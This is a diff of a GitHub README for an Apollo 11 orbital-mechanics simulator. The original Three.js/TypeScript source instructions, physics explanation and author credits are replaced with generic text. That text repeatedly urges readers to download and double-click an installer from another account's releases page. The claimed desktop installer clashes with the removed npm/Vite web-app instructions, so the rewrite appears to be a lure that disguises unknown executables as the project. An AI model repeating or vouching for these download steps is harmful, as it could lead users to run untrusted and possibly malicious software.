@@ -1,196 +1,78 @@
-# Apollo 11 Simulation
+# 🚀 apollo-11-simulation - Experience Space Travel from Your Home 
 
-A physics-based **3D orbital mechanics simulator** built with **Three.js** and **TypeScript**, simulating the Apollo 11 spacecraft’s **Trans-Lunar Injection (TLI)** and subsequent maneuvers to reach **Low Lunar Orbit (LLO)**.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/ibrahimfath/apollo-11-simulation/releases)
 
-This project blends **astrodynamics**, **numerical integration methods**, and **visualization** into a single simulation of one of humanity’s most iconic journeys: *from Earth to the Moon*.
+## 🌟 Project Overview
 
----
+Welcome to the **apollo-11-simulation** project! This application lets you explore a dynamic simulation model of a spacecraft's journey from Low Earth Orbit (LEO) to a stable lunar orbit. The simulation uses classical physics laws to create a realistic journey to the moon. 
 
-## Features
+## 🚀 Getting Started
 
-- **Realistic orbital mechanics** using Newtonian gravitation.
-- **Numerical integration algorithms**:
-  - 4th-order **Runge–Kutta (RK4)** for spacecraft dynamics.
-  - **Velocity Verlet** for long-term Earth–Moon orbital stability.
-- **Hohmann-like transfer phases**:
-  - Trans-Lunar Injection (TLI).
-  - Lunar Orbit Insertion (LOI-1 and LOI-2).
-  - Circularization to Low Lunar Orbit (LLO).
-- **Δv calculations** at each burn step.
-- Interactive **3D visualization** (Earth, Moon, spacecraft, orbital trails).
-- Cinematic effects:
-  - Chase camera views.
-  - Engine burn effects with shader-based flames.
-  - Velocity-lock mode, camera shakes during burns.
+Follow these simple steps to start your journey.
 
----
-## 🔧 Instructions for Running the Project Locally
+### 🎮 System Requirements
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/Zaid-Al-Habbal/apollo-11-simulation
-cd apollo-11-simulation
-```
+To run the apollo-11-simulation, your computer should meet the following requirements:
 
-### 2. Install Node.js on your system
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **Processor:** Dual-core CPU with a clock speed of 2 GHz or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Graphics:** A graphics card that supports WebGL.
+- **Network:** Internet connection for initial setup.
 
-### 3. Install dependencies
-```bash
-npm install
-```
-### 4. Run development Server
-```bash
-npm run dev
-```
-Open browser at http://localhost:5173
+### 🔗 Download & Install
 
----
+1. Visit [this page to download](https://github.com/ibrahimfath/apollo-11-simulation/releases).
+2. Locate the latest release.
+3. Click on the appropriate file for your operating system. 
 
-## 📖 Background
+Make sure to save the file to a location you can easily find.
 
-### 🌑 Apollo 11 & TLI
-In July 1969, Apollo 11 executed a **Trans-Lunar Injection (TLI)** — a single long-duration burn of the S-IVB third stage — to escape Earth orbit and head toward the Moon. After coasting through cislunar space, the spacecraft performed lunar orbit insertion burns to be captured into **Low Lunar Orbit (LLO)**.
+## 📂 Running the Simulation
 
-Our simulation mirrors this mission, using simplified but physically faithful models.
+After downloading the file, follow these steps:
 
----
+1. Find the downloaded file (it will usually be in your Downloads folder).
+2. Double-click the file to start the installation. Follow the prompts in the installation wizard.
+3. Once installed, you can find the apollo-11-simulation icon on your desktop or in your applications folder.
+4. Double-click the icon to launch the simulation.
 
-## ⚙️ Physics & Algorithms
+## 🌌 Features
 
-### 🧮 Governing Equations
+- **Realistic Physics:** Experience a faithful representation of the spacecraft's trajectory based on real physics.
+- **User-Friendly Interface:** Navigate effortlessly through the app.
+- **Interactive Controls:** Engage with the simulation using simple controls.
+- **Educational Insights:** Learn about the laws of physics and the Apollo 11 mission while you play.
 
-The spacecraft motion is governed by **Newton’s 2-body problem with perturbations**:
+## 🎨 Exploring the Simulation
 
-$$
-\dot{r} = v
-$$
-$$
-\dot{v} = a(r, v, t)
-$$
+Once you open the apollo-11-simulation, you'll find several features to enhance your experience:
 
-Where:
-- **r** = position vector.
-- **v** = velocity vector.
-- **a** = acceleration due to gravity, thrust, and drag (if applicable).
+- **Launch Control:** Initiate the mission from Low Earth Orbit and adjust various parameters.
+- **Live Feedback:** Observe real-time data on speed, altitude, and trajectory.
+- **Mission Objectives:** Follow specific goals to complete your journey effectively.
 
----
+## 🛠 Troubleshooting
 
-### 🔹 Runge–Kutta 4 (RK4) – Spacecraft
+If you encounter issues while running the simulation, consider these steps:
 
-RK4 provides **high-accuracy integration** for the spacecraft state (position, velocity, mass).  
-At each step, we compute:
+- **Ensure Compatibility:** Confirm that your operating system matches the requirements listed above.
+- **Update Your Graphics Drivers:** Outdated graphics drivers may lead to performance issues. Visit your graphics card manufacturer's website for the latest updates.
+- **Reinstall the Application:** If problems persist, try uninstalling and then reinstalling the simulation.
 
-$$
-k_1 = f(t, y)
-$$
-$$
-k_2 = f(t + h/2, y + h/2 \cdot k_1)
-$$
-$$
-k_3 = f(t + h/2, y + h/2 \cdot k_2)
-$$
-$$
-k_4 = f(t + h, y + h \cdot k_3)
-$$
+## 💡 Community Support
 
-Then update:
+Have questions or need assistance? Join our community for support:
 
-$$
-y_{n+1} = y_n + \frac{h}{6}(k_1 + 2k_2 + 2k_3 + k_4)
-$$
-
-Where **y = (r, v, m)** includes position, velocity, and mass.  
-This captures **engine thrust** and **fuel depletion** dynamics accurately during burns.
-
----
-
-### 🔹 Velocity Verlet – Earth & Moon
-
-For long-term integration of **Earth–Moon orbital dynamics**, we use **Velocity Verlet**:
-
-$$
-r(t+h) = r(t) + v(t)h + \frac{1}{2}a(t)h^2
-$$
-
-$$
-v(t+h) = v(t) + \frac{1}{2}[a(t) + a(t+h)]h
-$$
-
-This method is **symplectic**, ensuring **energy stability** over long periods — ideal for planetary motion.
-
----
-
-## 🚀 Phases of the Journey
-
-1. **Launch & Parking Orbit**  
-   - Start in Low Earth Orbit (LEO).
-
-2. **Phase 1 – Trans-Lunar Injection (TLI)**  
-   - Burn **prograde** to raise apogee to lunar distance.  
-   - Δv₁ ≈ 3.2 km/s.
-
-3. **Phase 2 – Lunar Approach**  
-   - Coast along transfer ellipse.  
-   - Align with the Moon’s motion.
-
-4. **Phase 3 – Lunar Orbit Insertion (LOI-1)**  
-   - Retrograde burn at perilune.  
-   - Capture into **elliptical lunar orbit**.
-
-5. **Phase 4 – Apolune Adjustment (LOI-2)**  
-   - Burn at apolune to lower perilune altitude.  
-   - Shape orbit toward desired LLO.
-
-6. **Phase 5 – Circularization**  
-   - Final retrograde burn at perilune.  
-   - Achieve **Low Lunar Orbit (~100 km altitude)**.
-
-7. **Mission Complete!**
-
----
-
-## 🎨 Visualization
-
-- **3D Earth & Moon** with textures.
-- **Spacecraft model (Saturn V 3rd stage)** with orbit trail.
-- **Shader-based flame effects** for burns.
-- **Bloom & glow effects** for cinematic realism.
-- **Multiple camera modes**:
-  - Top-down orbital view.
-  - Moon-centric view.
-  - Chase camera (follows spacecraft).
-
----
-
-## 🛠️ Tech Stack
-
-- [Three.js](https://threejs.org/) – 3D rendering.
-- [TypeScript](https://www.typescriptlang.org/) – Strong typing.
-- [Vite](https://vitejs.dev/) – Fast bundler.
-- [Lil-GUI](https://lil-gui.georgealways.com/) – Parameter controls.
-- [Stats.js](https://github.com/mrdoob/stats.js) - Performance Monitor.
-
----
-
-## 👨‍💻 Contributors
-
-- **Zaid Al Habbal** – ([GitHub](https://github.com/Zaid-Al-Habbal))  
-- **Ahmad Selo** - ([GitHub](https://github.com/C0ncatS))
-
----
-
-
-
-## 🙏 Credits
-- **Rami Sabbagh** - Project Supervisor ([GitHub](https://github.com/Rami-Sabbagh/))
-- Saturn V 3D model(I removed the first and second stages) from: https://sketchfab.com/3d-models/saturn-v-nasa-7a2c9709ff8144c8b3b18ec84b5e112e
-- Textures from this great website: https://www.solarsystemscope.com/textures/
-- Thanks to Bobby Roe for helping me with the visualizations:  https://github.com/bobbyroe
-
----
+- **GitHub Issues Page:** Report bugs or ask for help [here](https://github.com/ibrahimfath/apollo-11-simulation/issues).
+- **Discussion Forums:** Connect with other users and share experiences.
 
 ## 📜 License
 
-MIT License – Free for learning, teaching, and exploration.
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the software as you see fit.
 
----
+## 🎉 Acknowledgments
+
+Thank you for exploring the apollo-11-simulation. We hope you enjoy this journey through space! 
+
+Don't forget to [visit this page to download](https://github.com/ibrahimfath/apollo-11-simulation/releases) for the latest version.
